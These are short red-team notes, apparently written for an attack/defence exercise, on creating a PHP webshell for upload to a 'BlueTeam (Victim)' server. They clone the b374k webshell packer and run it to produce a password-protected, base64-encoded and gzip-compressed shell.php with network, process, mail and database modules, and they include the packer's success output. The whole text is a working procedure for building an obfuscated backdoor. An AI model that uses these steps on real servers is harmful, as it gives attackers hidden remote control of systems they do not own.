WebShells
---------


#Create a php Webshell to upload to the BlueTeam(Victim)
#Also included locally in Blackarch/Kali (Test first locally)
#Upload Shell.php to BlueTeam(Victim)
git clone https://github.com/b374k/b374k.git
php -f index.php
php -f index.php -- -o shell.php -p password -s -b -z gzcompress -c 9

b374k shell packer 0.4.2

Filename		: shell.php
Password		: password
Theme			: default
Modules			: convert,database,info,mail,network,processes
Strip			: yes
Base64			: yes
Compression		: gzcompress
Compression level	: 9
Result			: Succeeded : [ shell.php ] Filesize : 111695

